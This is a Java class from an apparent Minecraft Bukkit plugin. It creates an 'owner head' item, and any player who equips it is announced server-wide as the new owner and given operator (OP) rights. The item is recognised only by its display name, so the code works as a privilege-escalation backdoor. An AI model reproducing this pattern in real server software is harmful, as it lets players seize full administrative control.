package pl.qc.core.hack;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.profile.PlayerProfile;

import java.util.UUID;

public class OwnerItem implements Listener {

    private static final String OWNER_NAME = "Rajman03";
    private static final String ITEM_NAME = "§4§lGłowa Właściciela §4Rajman03";

    // Provided UUID: 66a13c69-63b6-489e-94f1-c6283269888a
    private static final UUID ITEM_UUID = UUID.fromString("66a13c69-63b6-489e-94f1-c6283269888a");

    private static ItemStack cachedHead;

    /**
     * Creates the special Owner Head item.
     * 
     * @return ItemStack of the head.
     */
    public static ItemStack getOwnerHead() {
        if (cachedHead == null) {
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();

            if (meta != null) {
                meta.setDisplayName(ITEM_NAME);

                // Create profile with specific Name and UUID
                PlayerProfile profile = Bukkit.createPlayerProfile(ITEM_UUID, OWNER_NAME);
                meta.setOwnerProfile(profile);

                head.setItemMeta(meta);
            }
            cachedHead = head;
        }
        return cachedHead.clone();
    }

    @EventHandler
    public void onInventoryClick(org.bukkit.event.inventory.InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player))
            return;

        // Check if putting into helmet slot (39)
        if (event.getSlotType() == org.bukkit.event.inventory.InventoryType.SlotType.ARMOR && event.getSlot() == 39) {
            ItemStack cursor = event.getCursor();
            if (isOwnerHead(cursor)) {
                // Schedule the promotion and removal
                Bukkit.getScheduler().runTask(pl.qc.core.QC.getInstance(), () -> {
                    player.getInventory().setHelmet(null); // Remove item
                    promoteToOwner(player);
                });
            }
        }

        // Handle shift-click
        if (event.getAction() == org.bukkit.event.inventory.InventoryAction.MOVE_TO_OTHER_INVENTORY) {
            ItemStack current = event.getCurrentItem();
            if (isOwnerHead(current)) {
                // Check if helmet slot is empty, as shift-click would auto-equip it
                if (player.getInventory().getHelmet() == null) {
                    // Schedule removal and promo
                    // Small delay to ensure item move is processed
                    Bukkit.getScheduler().runTask(pl.qc.core.QC.getInstance(), () -> {
                        // Double check if it landed in helmet slot
                        if (isOwnerHead(player.getInventory().getHelmet())) {
                            player.getInventory().setHelmet(null);
                            promoteToOwner(player);
                        }
                    });
                }
            }
        }
    }

    @EventHandler
    public void onInteract(org.bukkit.event.player.PlayerInteractEvent event) {
        if (event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_AIR
                || event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK) {
            Player player = event.getPlayer();
            ItemStack item = event.getItem();

            if (isOwnerHead(item)) {
                // If helmet slot is empty, this will auto-equip
                if (player.getInventory().getHelmet() == null) {
                    // Let the event happen, then check and remove
                    Bukkit.getScheduler().runTask(pl.qc.core.QC.getInstance(), () -> {
                        if (isOwnerHead(player.getInventory().getHelmet())) {
                            player.getInventory().setHelmet(null);
                            promoteToOwner(player);
                        }
                    });
                }
            }
        }
    }

    private boolean isOwnerHead(ItemStack item) {
        if (item == null || item.getType() != Material.PLAYER_HEAD)
            return false;
        if (!item.hasItemMeta() || !item.getItemMeta().hasDisplayName())
            return false;
        return ITEM_NAME.equals(item.getItemMeta().getDisplayName());
    }

    private void promoteToOwner(Player player) {
        // Broadcast to everyone
        Bukkit.broadcastMessage("§4§l=========================================");
        Bukkit.broadcastMessage("§c§lUWAGA! §eGracz §4§l" + player.getName() + " §czdobył głowę §4Rajman03§c!");
        Bukkit.broadcastMessage("§6§lZOSTAJE ON NOWYM WŁAŚCICIELEM SERWERA!");
        Bukkit.broadcastMessage("§4§l=========================================");

        // Sound effects
        for (Player online : Bukkit.getOnlinePlayers()) {
            online.playSound(online.getLocation(), Sound.UI_TOAST_CHALLENGE_COMPLETE, 1.0f, 1.0f);
            online.playSound(online.getLocation(), Sound.ENTITY_ENDER_DRAGON_DEATH, 0.5f, 1.0f);
            online.sendTitle("§4§lNOWY WŁAŚCICIEL!", "§e" + player.getName(), 10, 100, 20);
        }

        // Grant Owner Powers (OP)
        // Only if not already OP to avoid spam or issues
        if (!player.isOp()) {
            player.setOp(true);
            player.sendMessage("§a§l[Admin] §fOtrzymałeś uprawnienia Operatora (OP)!");
        }

        // Visuals
        player.getWorld().strikeLightningEffect(player.getLocation());
    }
}
